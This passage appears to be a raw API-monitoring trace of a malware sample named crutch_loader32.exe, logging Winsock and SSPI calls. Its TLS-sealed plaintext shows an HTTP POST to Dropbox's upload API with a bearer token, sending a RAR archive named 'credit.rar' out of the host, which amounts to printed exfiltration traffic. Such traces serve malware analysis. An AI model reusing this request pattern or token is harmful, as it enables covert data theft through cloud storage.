+[PAR] unsigned long  fContextReq   : 0x811c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x0 (SECURITY_NETWORK_DREP)
+[PAR] PSecBufferDesc pInput        : 0x0
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x10f40f0
+[PAR] PSecBufferDesc pOutput       : 0x2a6f55c
+[PAR] unsigned long* pfContextAttr : 0x10c9000
+[PAR] PTimeStamp     ptsExpiry     : 0x10f40f8
+[RET] 0x748b63c6
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x1ad
+[PAR]  fd_set FAR*  readfds   : 0x2a6f2a4
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f1a0
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  timeval FAR* timeout   : 0x2a6f184
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x1ac
+[PAR] char   *buf : 0x11044c8
+[PAR] int    len  : 0xbf
+[RET] 0x748af80a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <FreeContextBuffer> in [SspiCli.dll] 
+[PAR] PVOID pvContextBuffer : 0x11044c8
+[RET] 0x748b645d
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x1ac
+[PAR] char   *buf   : 0x1107000
+[PAR] int    len    : 0x1000
+[RET] 0x748aefb7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <WSAGetLastError> in [WS2_32.dll] 
+[RET] 0x748aefc2
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x2a6f328
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x0
+[PAR]  timeval FAR* timeout   : 0x2a6f310
+[RET] 0x748a1f43
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f328
+[RET] 0x748a2018
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f42c
+[RET] 0x748a2031
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f530
+[RET] 0x748a204a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x1ad
+[PAR]  fd_set FAR*  readfds   : 0x2a6f3c8
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f2c4
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  timeval FAR* timeout   : 0x2a6f2a8
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f3c8
+[RET] 0x748a1c30
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f2c4
+[RET] 0x748a1c44
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x1ac
+[PAR] char   *buf   : 0x1107000
+[PAR] int    len    : 0x1000
+[RET] 0x748aefb7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <InitializeSecurityContextA> in [SspiCli.dll] 
+[PAR] PCredHandle    phCredential  : 0x10ece50
+[PAR] PCtxtHandle    phContext     : 0x10f40f0
+[PAR] CHAR*          pszTargetName : 0x10c9218
+[STR]                -> "content.dropboxapi.com"
+[PAR] unsigned long  fContextReq   : 0x811c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x0 (SECURITY_NETWORK_DREP)
+[PAR] PSecBufferDesc pInput        : 0x2a6f594
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x2
+[FLD]                -> pBuffers  = 0x2a6f5a0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x55d
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x10c96a8
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0
+[PAR] PSecBufferDesc pOutput       : 0x2a6f588
+[PAR] unsigned long* pfContextAttr : 0x10c9000
+[PAR] PTimeStamp     ptsExpiry     : 0x10f40f8
+[RET] 0x748b67c7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x1ad
+[PAR]  fd_set FAR*  readfds   : 0x2a6f2ec
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f1e8
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  timeval FAR* timeout   : 0x2a6f1cc
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x1ac
+[PAR] char   *buf : 0x10f9ae0
+[PAR] int    len  : 0xb6
+[RET] 0x748af80a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <FreeContextBuffer> in [SspiCli.dll] 
+[PAR] PVOID pvContextBuffer : 0x10f9ae0
+[RET] 0x748b687d
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x2a6f328
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x0
+[PAR]  timeval FAR* timeout   : 0x2a6f310
+[RET] 0x748a1f43
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f328
+[RET] 0x748a2018
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f42c
+[RET] 0x748a2031
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f530
+[RET] 0x748a204a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x1ad
+[PAR]  fd_set FAR*  readfds   : 0x2a6f3c8
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f2c4
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  timeval FAR* timeout   : 0x2a6f2a8
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f3c8
+[RET] 0x748a1c30
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f2c4
+[RET] 0x748a1c44
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x1ac
+[PAR] char   *buf   : 0x1107000
+[PAR] int    len    : 0x1000
+[RET] 0x748aefb7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <InitializeSecurityContextA> in [SspiCli.dll] 
+[PAR] PCredHandle    phCredential  : 0x10ece50
+[PAR] PCtxtHandle    phContext     : 0x10f40f0
+[PAR] CHAR*          pszTargetName : 0x10c9218
+[STR]                -> "content.dropboxapi.com"
+[PAR] unsigned long  fContextReq   : 0x811c (ISC_REQ_REPLAY_DETECT | ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY | ISC_REQ_STREAM)
+[PAR] unsigned long  Reserved1     : 0x0
+[PAR] unsigned long  TargetDataRep : 0x0 (SECURITY_NETWORK_DREP)
+[PAR] PSecBufferDesc pInput        : 0x2a6f594
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x2
+[FLD]                -> pBuffers  = 0x2a6f5a0
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x13a
+[FLD]                   -> BufferType = 0x2 (SECBUFFER_TOKEN)
+[FLD]                   -> pvBuffer   = 0x11044c8
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[PAR] unsigned long  Reserved2     : 0x0
+[PAR] PCtxtHandle    phNewContext  : 0x0
+[PAR] PSecBufferDesc pOutput       : 0x2a6f588
+[PAR] unsigned long* pfContextAttr : 0x10c9000
+[PAR] PTimeStamp     ptsExpiry     : 0x10f40f8
+[RET] 0x748b67c7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <QueryContextAttributesA> in [SspiCli.dll] 
+[PAR] PCtxtHandle    phContext     : 0x10f40f0
+[PAR] unsigned long  ulAttribute   : 0x4 (ISC_RET_REPLAY_DETECT)
+[PAR] void           *pBuffer      : 0x10c8fcc
+[RET] 0x748b6d17
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <SealMessage> in [SspiCli.dll] 
+[PAR] LSA_SEC_HANDLE ContextHandle         : 0x10f40f0
+[PAR] ULONG          QualityOfProtection   : 0x0
+[PAR] PSecBufferDesc MessageBuffers        : 0x2a6f520
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x2a6f52c
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x15
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x10c99f8
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x159
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x00000000010C9A0D
+[STR]                   -> "POST /2/files/upload HTTP/1.1\r\nHost: content.dropboxapi.com\r\nAccept: */*\r\nAuthorization: Bearer 8vnhYs6XqfAAAAAAAA"
+[STR]                      "AAPF7FRK_XOi_5K6GVnFd82cWcBXzEKrfGoyRP8kPC25OR\r\nDropbox-API-Arg: {"path": "/MyFiles/credit.rar","mode": "add","autoren"
+[STR]                      "ame": true,"mute": false}\r\nContent-Type: application/octet-stream\r\nContent-Length: 3143\r\nExpect: 100-continue\r\n\"
+[STR]                      "r\n"
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x40
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x10c9b66
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[PAR] ULONG          MessageSequenceNumber : 0x0
+[RET] 0x748b6e29
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x0
+[PAR]  fd_set FAR*  writefds  : 0x2a6f3f0
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f1e8
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  timeval FAR* timeout   : 0x2a6f1cc
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f3f0
+[RET] 0x748a1c98
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f1e8
+[RET] 0x748a1caa
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <send> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x1ac
+[PAR] char   *buf : 0x10c99f8
+[PAR] int    len  : 0x1a5
+[RET] 0x748af80a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x1ad
+[PAR]  fd_set FAR*  readfds   : 0x2a6f3f8
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f2f4
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  timeval FAR* timeout   : 0x2a6f2d8
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x2a6f328
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x0
+[PAR]  timeval FAR* timeout   : 0x2a6f310
+[RET] 0x748a1f43
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f328
+[RET] 0x748a2018
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f42c
+[RET] 0x748a2031
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f530
+[RET] 0x748a204a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x1ad
+[PAR]  fd_set FAR*  readfds   : 0x2a6f3f8
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  writefds  : 0x0
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f2f4
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  timeval FAR* timeout   : 0x2a6f2d8
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f3f8
+[RET] 0x748a1c30
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f2f4
+[RET] 0x748a1c44
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <recv> in [WS2_32.dll] 
+[PAR] SOCKET s      : 0x1ac
+[PAR] char   *buf   : 0x1117f50
+[PAR] int    len    : 0x4400
+[RET] 0x748aefb7
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <DecryptMessage> in [SspiCli.dll] 
+[PAR] PCtxtHandle    phContext    : 0x10f40f0
+[PAR] PSecBufferDesc pMessage     : 0x2a6f558
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x2a6f564
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x65
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x1117f50
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[PAR] unsigned long  MessageSeqNo : 0x0
+[PAR] unsigned long* pfQOP        : 0x0
+[RET] 0x748b7229
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <DecryptMessage>
+[PAR] PSecBufferDesc pMessage     : 0x0
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x2a6f564
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x15
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x1117f50
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0x19
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[FLD]                   -> pvBuffer   = 0x1117f65
+[STR]                   -> "HTTP/1.1 100 Continue\r\n\r\n"
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x37
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x1117f7e
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x2a6f328
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  writefds  : 0x2a6f42c
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  exceptfds : 0x0
+[PAR]  timeval FAR* timeout   : 0x2a6f310
+[RET] 0x748a1f43
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f328
+[RET] 0x748a2018
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f42c
+[RET] 0x748a2031
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f530
+[RET] 0x748a204a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f328
+[RET] 0x748a2018
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f42c
+[RET] 0x748a2031
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f530
+[RET] 0x748a204a
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x1ad
+[PAR]  fd_set FAR*  readfds   : 0x2a6f3f8
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  writefds  : 0x2a6f4fc
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f2f4
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  timeval FAR* timeout   : 0x2a6f2d8
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f3f8
+[RET] 0x748a1c30
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f2f4
+[RET] 0x748a1c44
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f4fc
+[RET] 0x748a1c98
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f2f4
+[RET] 0x748a1caa
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <SealMessage> in [SspiCli.dll] 
+[PAR] LSA_SEC_HANDLE ContextHandle         : 0x10f40f0
+[PAR] ULONG          QualityOfProtection   : 0x0
+[PAR] PSecBufferDesc MessageBuffers        : 0x2a6f57c
+[FLD]                -> ulVersion = 0x0 (SECBUFFER_VERSION)
+[FLD]                -> cBuffers  = 0x4
+[FLD]                -> pBuffers  = 0x2a6f588
+[FLD]                   -> pBuffers[0]
+[FLD]                   -> cbBuffer   = 0x15
+[FLD]                   -> BufferType = 0x7 (SECBUFFER_STREAM_HEADER)
+[FLD]                   -> pvBuffer   = 0x111c358
+[FLD]                   -> pBuffers[1]
+[FLD]                   -> cbBuffer   = 0xc47
+[FLD]                   -> BufferType = 0x1 (SECBUFFER_DATA)
+[BIN] ([0x52, 0x61, 0x72, 0x21, 0x1a, 0x07, 0x00, 0xce, 0x99, 0x73, 0x80, 0x00, 0xd0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x64, 0x62, 0x35, 0x34, 0x66, 0x65, 0x31, 0x31, 0x35
+        0x63, 0x64, 0x31, 0x66, 0x30, 0x32, 0x66, 0x30, 0x35, 0x36, 0x61, 0x63, 0x64, 0x32, 0x33, 0x31, 0x31, 0x66, 0x39, 0x66, 0x65, 0x66, 0xa4, 0x80, 0x9c, 0xd8, 0xf1, 0x1b, 0xe5, 0x84
+        0x73, 0x71, 0x6d, 0x07, 0xca, 0x7d, 0xac, 0x16, 0xde, 0x12, 0x8f, 0xef, 0x55, 0x12, 0xdd, 0x14, 0x1c, 0x53, 0x44, 0x3e, 0xdf, 0x63, 0x87, 0x77, 0xe8, 0xe4, 0xbf, 0xd9, 0x61, 0x2d
+        0x8f, 0x81, 0x46, 0x60, 0xcd, 0xa3, 0x02, 0xa0, 0x3f, 0x84, 0x38, 0xff, 0x2e, 0x35, 0xed, 0x65, 0x33, 0x98, 0x05, 0x9e, 0xdd, 0xc1, 0x94, 0x2c, 0xd8, 0x53, 0x1e, 0x1c, 0x90, 0x85
+        0x2c, 0xec, 0xf5, 0xfe, 0x24, 0x24, 0x0f, 0xac, 0x89, 0x1b, 0xdf, 0x15, 0xd0, 0x18, 0xed, 0x5d, 0xa6, 0x87, 0x65, 0x6c, 0x4e, 0xe8, 0x9d, 0x6a, 0x02, 0xc7, 0x0e, 0x00, 0x71, 0xca
+        0x5c, 0x9f, 0xc7, 0xb6, 0xae, 0xb6, 0x57, 0x76, 0x65, 0x10, 0x53, 0xf7, 0xc8, 0x46, 0x40, 0xfa, 0xfe, 0x07, 0x74, 0x17, 0x36, 0x9e, 0xce, 0x22, 0xd2, 0xf2, 0x92, 0x31, 0xaf, 0x6b
+       [TRUNCATED] ])
+[FLD]                   -> pBuffers[2]
+[FLD]                   -> cbBuffer   = 0x40
+[FLD]                   -> BufferType = 0x6 (SECBUFFER_STREAM_TRAILER)
+[FLD]                   -> pvBuffer   = 0x111cfb4
+[FLD]                   -> pBuffers[3]
+[FLD]                   -> cbBuffer   = 0x0
+[FLD]                   -> BufferType = 0x0 (SECBUFFER_EMPTY)
+[FLD]                   -> pvBuffer   = 0x0
+[PAR] ULONG          MessageSequenceNumber : 0x0
+[RET] 0x748b6e29
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <select> in [WS2_32.dll] 
+[PAR]  int          nfds      : 0x0
+[PAR]  fd_set FAR*  readfds   : 0x0
+[PAR]  fd_set FAR*  writefds  : 0x2a6f44c
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  fd_set FAR*  exceptfds : 0x2a6f244
+[FLD]               -> socket_0 = 0x1ac
+[PAR]  timeval FAR* timeout   : 0x2a6f228
+[RET] 0x748a1b6b
+
+[ * ] [pid 0xa5c][tid 0xa9c] c:\users\user\desktop\crutch\crutch_loader32.exe
+[API] <__WSAFDIsSet> in [WS2_32.dll] 
+[PAR] SOCKET fd  : 0x1ac
+[PAR] fd_set set : 0x2a6f44c
